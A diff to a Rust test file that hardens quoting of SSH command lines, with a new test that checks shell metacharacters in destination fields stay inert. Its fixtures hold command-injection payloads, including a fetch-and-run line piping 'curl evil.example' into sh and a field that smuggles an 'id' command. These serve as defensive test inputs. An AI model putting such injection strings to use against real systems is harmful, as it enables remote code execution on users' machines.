@@ -407,7 +407,7 @@ fn local_fs_rules_are_gated_to_local_keys() {
 /// Covers R13/KTD10: the tab's `ssh` line must survive Warp's own
 /// warpification gate, which requires exactly one positional argument. Every
 /// user-entered value therefore stays inside an option or behind the `--`
-/// fence, and the identity is quoted so a space in it cannot split into a
+/// fence, and is quoted so neither a space nor a metacharacter can split into a
 /// second positional and silently un-warpify the session.
 #[test]
 fn ssh_command_keeps_a_single_positional_destination() {
@@ -421,13 +421,13 @@ fn ssh_command_keeps_a_single_positional_destination() {
     let command = remote_ssh_command(&target);
     assert_eq!(
         command,
-        "ssh -i '/Users/v/my keys/id' -p 2222 -- vinh@10.0.0.7"
+        "ssh -i '/Users/v/my keys/id' -p 2222 -- 'vinh@10.0.0.7'"
     );
 
     // The remote path never appears on the ssh line: appending it would be the
     // second positional that costs warpification (KTD7).
     assert!(!command.contains("/srv/my app"));
-    assert!(command.ends_with("vinh@10.0.0.7"));
+    assert!(command.ends_with("'vinh@10.0.0.7'"));
 
     let no_identity = RemoteTarget {
         identity: String::new(),
@@ -436,7 +436,39 @@ fn ssh_command_keeps_a_single_positional_destination() {
     };
     assert_eq!(
         remote_ssh_command(&no_identity),
-        "ssh -p 22 -- vinh@10.0.0.7"
+        "ssh -p 22 -- 'vinh@10.0.0.7'"
+    );
+}
+
+/// Covers KTD10: `remote_ssh_command` is typed into the *local* shell, so a
+/// metacharacter in the destination is command execution on this machine, not
+/// just a word-splitting hazard. Both halves of `user@host` must be quoted —
+/// the destination is the one field the `--` fence cannot protect, because the
+/// fence only stops it being read as an *option*.
+#[test]
+fn ssh_command_quotes_metacharacters_in_the_destination() {
+    let injected = RemoteTarget {
+        server: "h; curl evil.example | sh".to_string(),
+        port: DEFAULT_SSH_PORT,
+        user: "vinh".to_string(),
+        identity: String::new(),
+        remote_path: "/srv/app".to_string(),
+    };
+    assert_eq!(
+        remote_ssh_command(&injected),
+        "ssh -p 22 -- 'vinh@h; curl evil.example | sh'"
+    );
+
+    // A quote in the field closes and reopens the quoting rather than escaping
+    // it, so the payload stays a single inert word.
+    let quoted = RemoteTarget {
+        user: "v'; id; '".to_string(),
+        server: "host".to_string(),
+        ..injected
+    };
+    assert_eq!(
+        remote_ssh_command(&quoted),
+        r"ssh -p 22 -- 'v'\''; id; '\''@host'"
     );
 }
 
